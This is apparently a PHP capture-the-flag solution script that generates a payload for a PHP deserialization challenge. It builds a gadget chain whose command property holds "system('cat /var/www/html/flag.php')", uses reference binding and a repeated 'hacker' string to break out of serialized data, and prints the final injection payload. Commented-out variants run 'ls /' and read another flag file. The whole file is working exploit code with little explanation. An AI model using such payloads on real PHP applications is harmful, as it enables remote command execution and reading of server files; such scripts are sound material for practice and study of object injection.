<?php
// class test{
//     public $a;
//     public $b;
//     public $c;
// }

// $d=new test();
// $d->b=&$d->a;
// $d->c="system('cat /fffffffffflagafag');";
// echo(serialize($d));
// class nothing{
//     public $a;
//     public $b;
//     public $t;
// }
// class output{
//     public $a;
// }
// class youwant{
//     public $cmd;
// }
// $r=new nothing;
//$r->a=&$r->b;
// $r->t=new output;
// $t->a=new youwant;
// $a->cmd="system('ls /');";
// echo(serialize($r));
class output{
    public $a;
    function __construct(){
        $this->a=new youwant();
    }
}
class nothing{
    public $a;
    public $b;
    public $t;
    function __construct(){
        $this->a=&$this->b;
        $this->b='xx';
        $this->t=new output();
    }
}
class youwant{
    public $cmd;
    function __construct()
    {
        $this->cmd="system('cat /var/www/html/flag.php');";
    }
}

$basedata = (base64_encode(serialize(new nothing())));
$str = '";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:'.strlen($basedata).':"'.$basedata.'";s:2:"ob";N;}';
echo $str."\n";
$hacker='';
for($i=0;$i<strlen($str);$i++)
{
    $hacker.='hacker';
}
$payload = $hacker.$str;
echo $payload;